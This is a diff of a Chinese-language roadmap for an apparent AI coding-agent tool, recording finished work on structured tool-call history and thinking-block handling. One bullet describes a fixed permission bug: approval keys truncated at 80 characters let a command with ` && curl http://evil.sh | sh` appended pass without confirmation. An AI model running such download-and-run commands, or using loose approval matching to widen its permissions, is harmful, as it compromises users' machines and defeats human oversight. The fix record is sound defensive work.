@@ -193,10 +193,11 @@
   - ✅ **GLOSSARY 5 处同文件锚点死链修好**（`#项目元数据` ×4、`#event-subscription` ×1，按该文件其余 30+ 处已用的“全 slug 含中文后缀”约定对齐），并把检查固化为 `verify-docs.mjs`；其中“入站锚点契约”6 条把被 DECISION_LOG / GLOSSARY 引用的标题文字钉死（DECISION_LOG 是 append-only，断链没法在源头修，只能不让标题变）
   - ⏸ **压缩用量没回流（`/usage` 少算）本轮不做**：要改就得改 `ChatResult` 的形状，牵连两个 provider 的非流式路径 + `stream-helper` + 多套 verify 脚本，是独立的一件事，已在上面“可观测性增强”的剩余项里
   - 遗留两项：`src/runtime/commands/` 空目录仍在（git 不跟踪空目录，仓库里本就没它，只是本地残留）；另查出 **`InputHandler` 同名冲突**（`runtime.ts` 的函数类型 vs `io/ui/input-handler.ts` 的类），未改、只在两处各加注释互指，详见 ARCHITECTURE.md 第四节第 8 条
-- [ ] **历史结构化数据接通** —（2026-09-04 立项）让跨用户轮的历史带上 `tool_calls` / `tool_call_id` / `name`，使模型看得到上一轮真正调了什么工具、结果是什么
-  - 现状：`MessageEntry` 的格式**早就支持**（三个可选字段 + `appendMessage` 的 `extra` + `getMessages()` 的还原），但是**双向死路**——入口没人写（`runtime.ts` 两处 `appendMessage` 都不传 `extra`，`agent-loop.ts` 里一处 `appendMessage` 都没有，尽管存储层头注释声称调用方含“Agent 循环”），出口被堵（`runtime.ts` 组装 `toolMessages` 时只映射 `role` + `content`）
+- [x] **历史结构化数据接通** —（2026-09-04 立项；**2026-09-12 按方案 B 落地**）
+  - 补记：**方案 B（thinking 开关分叉）**——agent-loop 以 `turnLog` 上交本轮生成的中间消息，runtime 逐条带 extra 落盘；请求侧 thinking 关（或 auto 未激活）→ 历史全量结构化回传（跨轮工具可见），thinking 开 → 降级纯文本（tool 结果转 user 文本、空 assistant 轮剔除），`thinkingBlocks` 仍不落盘（全保真方案留作将来增量）。安全阀原样保留当兜底。落盘 thinking 块的"方案 A"被否的原因：契约/三存储后端/compaction 交互全要动，实现面与收益不成比例。实现细节见 ARCHITECTURE.md 第四节第 9 条的改写版
+  - 原状：`MessageEntry` 的格式**早就支持**（三个可选字段 + `appendMessage` 的 `extra` + `getMessages()` 的还原），但是**双向死路**——入口没人写（`runtime.ts` 两处 `appendMessage` 都不传 `extra`，`agent-loop.ts` 里一处 `appendMessage` 都没有，尽管存储层头注释声称调用方含“Agent 循环”），出口被堵（`runtime.ts` 组装 `toolMessages` 时只映射 `role` + `content`）
   - **前置障碍（不能只接线）**：出口那道丢弃是**承重的**。`resolveAnthropicThinking` 的安全阀一见“带 `tool_calls` 但无 `thinkingBlocks` 的 assistant 消息”就强制关 thinking，而 `thinkingBlocks` 永不落盘——直接透传会让任何有过工具调用的会话把 extended thinking **静默全程关闭**（看上去像修好了历史保真度，实际是拿推理能力换了它）。要接通必须先定 thinking 块的历史策略：要么落盘 `signature`（体积 + 敏感数据），要么把带工具调用的历史轮折叠成文本（丢工具语义）
-  - 依赖：无硬依赖；但若同时要落盘 tool 结果消息，需给 `AgentLoopServiceImpl` 注入 session（当前它拿不到，只拿到 events）
+  - 依赖：无硬依赖；但若同时要落盘 tool 结果消息，需给 `AgentLoopServiceImpl` 注入 session（当前它拿不到，只拿到 events）——**实际落地时用了更干净的解法**：agent-loop 把中间消息作为 `turnLog` **返回**，落盘仍归 runtime，不给循环注入存储依赖
   - 本轮已做的部分：行为一行未改，只把五处失真措辞改正、三处承重位置加警告注释，并把“入口未接线 + 出口承重”固化为 `verify-session.ts` ⑨ 段断言（下次谁想“顺手补全”先撞上测试）。详见 ARCHITECTURE.md 第四节第 9 条
 - [x] **授权边界精确化** —（2026-09-04 落地）关掉 ARCHITECTURE.md 第四节第 10 条架构债：`permission/manager.ts` 的 `startsWith` 前缀匹配换成 `Set<string>` 精确匹配，`agent-loop.ts` 的授权兜底键不再 `.slice(0, 80)`，三个需确认的工具各定义一个 `permissionKey`（write / edit = 归一化 path，bash = 完整命令）
   - 修掉的是**静默扩权**（实测，不是推导）：批准 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会被自动放行——两个键在 80 字符处截成了逐字符相同的串。用户点的是“允许这一条”，系统给出的是“允许前 80 字符相同的所有调用”
@@ -338,9 +339,7 @@
    等确认无外部消费者再做）；② 背压策略（目前是已知缺口，本地管道很少触发）。
    做完 flint 就能被任意 ACP 客户端（Zed / JetBrains / Toad 等）直接驱动；
    但即便现在不做，映射表那套字段名已经是对的，将来不必推倒重来。
-2. **历史结构化数据接通（P6）** —— 价值高但**卡在一个未定的设计决策**上：thinking 块的历史策略
-   没定就不能接线（直接透传会让任何有过工具调用的会话把 extended thinking 静默全程关掉）。
-   想做先做决策，不要先写代码。
+2. **历史结构化数据接通（P6）** —— ✅ **已于 2026-09-12 按方案 B 落地**（thinking 开关分叉，细节见上面 P6 该条的补记）。"模型看得到上一轮调了什么工具"从今天起成立。
 3. **工具生命周期 Hook（P6）** —— ✅ **已于 2026-09-12 落地**（`before_tool_call` / `after_tool_call`，
    可拦截、不可改参，细节见上面 P6 Hook 条的补记）。"改完自动跑测试""工具级审计"从今天起有落点。
 4. **会话仓库层 / 分支摘要 / 技能热重载（P6）** —— 会话仓库层 ✅ **已于 2026-09-12 落地**（见上面
